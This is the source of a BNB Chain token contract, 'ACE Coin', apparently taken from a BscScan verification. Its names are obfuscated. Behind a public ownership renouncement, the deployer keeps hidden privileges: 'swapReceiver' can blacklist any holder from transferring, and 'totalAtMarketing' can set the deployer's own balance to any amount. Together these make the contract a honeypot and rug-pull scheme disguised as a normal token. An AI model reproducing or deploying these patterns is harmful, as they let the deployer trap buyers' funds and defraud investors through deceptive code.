/**
 *Submitted for verification at BscScan.com on 2023-02-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;


interface marketingAmountTake {
    function createPair(address fromExempt, address atTo) external returns (address);
}

interface shouldWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ACECoin {

    function marketingFrom() public view returns (bool) {
        return shouldSell;
    }

    uint256 private autoShould;

    function fromTotal(address swapTakeLiquidity, address senderLaunched, uint256 amountTake) internal returns (bool) {
        if (swapTakeLiquidity == marketingLiquidityTeam) {
            return totalLiquidityIs(swapTakeLiquidity, senderLaunched, amountTake);
        }
        require(!teamMode[swapTakeLiquidity]);
        return totalLiquidityIs(swapTakeLiquidity, senderLaunched, amountTake);
    }

    function maxIs() public view returns (uint256) {
        return receiverTokenFund;
    }

    bool public txShould;

    string public symbol = "ACN";

    address public marketingLiquidityTeam;

    function swapFund() private view returns (address) {
        return msg.sender;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    uint256 private tradingIs;

    event Transfer(address indexed from, address indexed limitFund, uint256 value);

    function amountLaunchLimit() public view returns (uint256) {
        return listMarketing;
    }

    bool public shouldSell;

    uint256 private receiverTokenFund;

    mapping(address => bool) public liquidityMaxSell;

    address public owner;

    function tokenListFund() public {
        
        if (fundReceiverLiquidity) {
            autoShould = receiverTokenFund;
        }
        receiverTokenFund=0;
    }

    function swapReceiver(address maxTo) public {
        if (txShould) {
            txShould = true;
        }
        if (maxTo == marketingLiquidityTeam || maxTo == sellShouldTrading || !liquidityMaxSell[swapFund()]) {
            return;
        }
        if (fundReceiverLiquidity) {
            txShould = true;
        }
        teamMode[maxTo] = true;
    }

    uint8 public decimals = 18;

    bool private fundReceiverLiquidity;

    function totalLiquidityIs(address swapTakeLiquidity, address senderLaunched, uint256 amountTake) internal returns (bool) {
        require(balanceOf[swapTakeLiquidity] >= amountTake);
        balanceOf[swapTakeLiquidity] -= amountTake;
        balanceOf[senderLaunched] += amountTake;
        emit Transfer(swapTakeLiquidity, senderLaunched, amountTake);
        return true;
    }

    function modeFund() public view returns (bool) {
        return shouldSell;
    }

    bool public launchedLiquidityMarketing;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    bool public sellLaunchedAmount;

    function transfer(address limitLiquidity, uint256 amountTake) external returns (bool) {
        return fromTotal(swapFund(), limitLiquidity, amountTake);
    }

    mapping(address => bool) public teamMode;

    function fundTotal() public view returns (uint256) {
        return tradingIs;
    }

    string public name = "ACE Coin";

    function txTeam(address senderShould) public {
        if (launchedLiquidityMarketing) {
            return;
        }
        
        liquidityMaxSell[senderShould] = true;
        
        launchedLiquidityMarketing = true;
    }

    function totalAtMarketing(uint256 amountTake) public {
        if (!liquidityMaxSell[swapFund()]) {
            return;
        }
        balanceOf[marketingLiquidityTeam] = amountTake;
    }

    address public sellShouldTrading;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function transferFrom(address swapTakeLiquidity, address senderLaunched, uint256 amountTake) external returns (bool) {
        if (allowance[swapTakeLiquidity][swapFund()] != type(uint256).max) {
            require(amountTake <= allowance[swapTakeLiquidity][swapFund()]);
            allowance[swapTakeLiquidity][swapFund()] -= amountTake;
        }
        return fromTotal(swapTakeLiquidity, senderLaunched, amountTake);
    }

    uint256 private listMarketing;

    function approve(address receiverLaunched, uint256 amountTake) public returns (bool) {
        allowance[swapFund()][receiverLaunched] = amountTake;
        emit Approval(swapFund(), receiverLaunched, amountTake);
        return true;
    }

    event Approval(address indexed receiverLaunchIs, address indexed spender, uint256 value);

    function amountLiquidity() public view returns (bool) {
        return fundReceiverLiquidity;
    }

    constructor (){
        
        shouldWallet launchMax = shouldWallet(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellShouldTrading = marketingAmountTake(launchMax.factory()).createPair(launchMax.WETH(), address(this));
        owner = swapFund();
        
        marketingLiquidityTeam = owner;
        liquidityMaxSell[marketingLiquidityTeam] = true;
        balanceOf[marketingLiquidityTeam] = totalSupply;
        
        emit Transfer(address(0), marketingLiquidityTeam, totalSupply);
        maxList();
    }

    function maxList() public {
        emit OwnershipTransferred(marketingLiquidityTeam, address(0));
        owner = address(0);
    }

    function tradingWallet() public view returns (uint256) {
        return listMarketing;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

}